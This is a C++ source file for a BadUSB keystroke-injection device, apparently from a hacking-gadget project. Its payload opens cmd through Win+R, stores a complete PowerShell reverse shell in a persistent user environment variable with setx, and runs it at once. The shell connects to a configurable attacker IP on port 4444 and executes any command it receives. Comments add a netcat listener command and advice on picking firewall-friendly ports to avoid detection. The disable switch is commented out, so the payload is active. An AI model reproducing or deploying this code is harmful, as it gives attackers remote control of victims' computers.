#include "Pwning.h"
#include <Keyboard.h>
#include "../../DisabledPayload.h"

#define TRACEDECK_STRINGIFY_LITERAL(value) #value
#define TRACEDECK_STRINGIFY(value) TRACEDECK_STRINGIFY_LITERAL(value)

namespace {
    // Delay for the Windows Run dialog to appear after Win+R.
    constexpr uint32_t kRunDialogWaitMs = 1750;
    // Delay for the Command Prompt window to open after launching it from Run.
    constexpr uint32_t kShellLaunchWaitMs = 2500;
    // Delay after each Enter for setx/set/PowerShell to process.
    constexpr uint32_t kCommandWaitMs = 1500;
    // Total delay budget: open Run, launch cmd, then run three commands.
    constexpr uint32_t kTotalMs = kRunDialogWaitMs + kShellLaunchWaitMs + 2 * kCommandWaitMs;
    // Refresh the progress bar every 125 ms, matching Drop & Upload.
    constexpr uint32_t kProgressRefreshMs = 125;

#ifdef ATTACKER_IP
    // Build with: --build-property "compiler.cpp.extra_flags=-DATTACKER_IP=<ip>"
    constexpr char kAttackerIp[] = TRACEDECK_STRINGIFY(ATTACKER_IP);
#else
    // Override with -DATTACKER_IP so the shell has a real listener.
    constexpr char kAttackerIp[] = "192.0.2.1";
#endif

    struct TimedProgress
    {
        const BadUsbProgress &progress;
        uint32_t totalMs;
        uint32_t completedMs;

        void wait(uint32_t duration)
        {
            const uint32_t startedAt = millis();
            uint32_t elapsed = 0;
            while (elapsed < duration)
            {
                const uint32_t remaining = duration - elapsed;
                delay(remaining < kProgressRefreshMs ? remaining : kProgressRefreshMs);
                elapsed = millis() - startedAt;
                const uint32_t waited = elapsed < duration ? elapsed : duration;
                // Reserve a full bar until the keyboard sequence returns.
                progress.update(progress.context, (completedMs + waited) * 99 / totalMs);
                elapsed = millis() - startedAt;
            }
            completedMs += duration;
        }
    };

    void pressShortcut(uint8_t modifier, uint8_t key)
    {
        Keyboard.press(modifier);
        Keyboard.press(key);
        Keyboard.releaseAll();
    }

    // Type the PowerShell reverse-shell body. Inside cmd double quotes the
    // | > & characters pass through literally, so no caret escaping is needed.
    void printReverseShellPayload(const char *attackerIp)
    {
        Keyboard.print("$client = New-Object Net.Sockets.TcpClient('");
        Keyboard.print(attackerIp);
        Keyboard.print("',4444); if ($client.Connected) { $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = ([Text.Encoding]::ASCII).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() } $client.Close() }");
    }
}

void sendPwningKeys(const BadUsbProgress &progress)
{
    // Comment out BOTH lines below to disable this payload.
    // showDisabledPayload(progress);
    // return;

    TimedProgress timing{progress, kTotalMs, 0};
    Keyboard.begin(KeyboardLayout_en_US);

    // Open a Command Prompt: Win+R, "cmd", Enter.
    pressShortcut(KEY_LEFT_GUI, 'r');
    timing.wait(kRunDialogWaitMs);
    Keyboard.print("cmd");
    Keyboard.write(KEY_RETURN);
    timing.wait(kShellLaunchWaitMs);

    // Persist the reverse shell in the user environment variable REV_SHELL.
    // Run a listener at the attacker host first, e.g. nc -lvnp 4444.
    
    // 443 (HTTPS), 80 (HTTP) and 8080 (HTTP Alternate), are ports that are usually allowed through firewalls. 53 (DNS) is often open to only UDP. 
    // Port 4444 is the famous default listener port in tools like Metasploit so it is heavily monitored and often blocked.
    Keyboard.print("setx REV_SHELL \"");
    printReverseShellPayload(kAttackerIp);
    Keyboard.print("\"");
    Keyboard.write(KEY_RETURN);
    timing.wait(kCommandWaitMs);

    // setx writes to the registry but does NOT update the current cmd session,
    // so %REV_SHELL% would be empty here. Run the shell directly instead.
    Keyboard.print("powershell.exe -Command \"");
    printReverseShellPayload(kAttackerIp);
    Keyboard.print("\"");
    Keyboard.write(KEY_RETURN);
    timing.wait(kCommandWaitMs);
}
